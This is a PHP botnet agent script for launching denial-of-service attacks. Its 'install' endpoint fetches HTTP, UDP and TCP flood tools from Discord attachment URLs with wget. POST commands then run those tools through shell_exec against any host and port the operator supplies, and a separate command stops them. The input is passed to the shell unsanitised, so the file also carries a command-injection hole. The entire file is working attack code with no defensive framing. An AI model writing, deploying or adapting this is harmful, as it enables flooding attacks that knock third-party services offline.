<?php  

if (!empty($_GET["ping"])){
	$currentPageUrl = $_SERVER["HTTP_HOST"];
	echo "bot: ", $currentPageUrl.$_SERVER["SCRIPT_NAME"], " | pong";
}

if (!empty($_GET["install"])){
	shell_exec("wget -nc https://cdn.discordapp.com/attachments/826078132444332032/972969809534939187/HTTP-RAW.js");
	shell_exec("wget -nc https://cdn.discordapp.com/attachments/826078132444332032/972969809774002257/HTTP-RAND.js");
	shell_exec("wget -nc https://cdn.discordapp.com/attachments/826078132444332032/973304386107359232/tcp_kill.js");
	shell_exec("wget -nc https://cdn.discordapp.com/attachments/826078132444332032/973567879914070066/udp.py");
	echo("all methods has been downloaded");
}




if (!empty($_POST["method"])){
	$method = $_POST["method"];

	if($method == "1"){     //http-raw
		$host = $_POST["host"];
		$time = $_POST["time"];
		echo("http-raw flood sent to $host $time");
		shell_exec("node HTTP-RAW.js $host $time");
	}

	if($method == "2"){     //http-rand
		$host = $_POST["host"];
		$time = $_POST["time"];
		echo("http-rand flood sent to $host $time");
		shell_exec("node HTTP-RAND.js $host $time");
	}

	if($method == "3"){     //python udp 
		$host = $_POST["host"];
		$port = $_POST["port"];
		$time = $_POST["time"];
		echo("udp flood sent to $host:$port $time");
		shell_exec("python3 udp.py $host $port $time 50000 50");
	}

	if($method == "4"){     //node tcp_kill connect 
		$host = $_POST["host"];
		$port = $_POST["port"];
		$time = $_POST["time"];
		echo("tcp_kill connect sent to $host:$port $time");
		shell_exec("node tcp_kill.js connect $host:$port $time");
	}

	if($method == "5"){     //node tcp_kill byte 
		$host = $_POST["host"];
		$port = $_POST["port"];
		$time = $_POST["time"];
		echo("tcp_kill byte sent to $host:$port $time");
		shell_exec("node tcp_kill.js byte $host:$port $time");
	}

	if($method == "6"){     //node tcp_kill big 
		$host = $_POST["host"];
		$port = $_POST["port"];
		$time = $_POST["time"];
		echo("tcp_kill big sent to $host:$port $time");
		shell_exec("node tcp_kill.js big $host:$port $time");
	}
}
else{
	if (!empty($_POST["stop"])){
		echo("all attacks has been stopped");
		shell_exec("pkill node && pkill python");
	}
}



?>
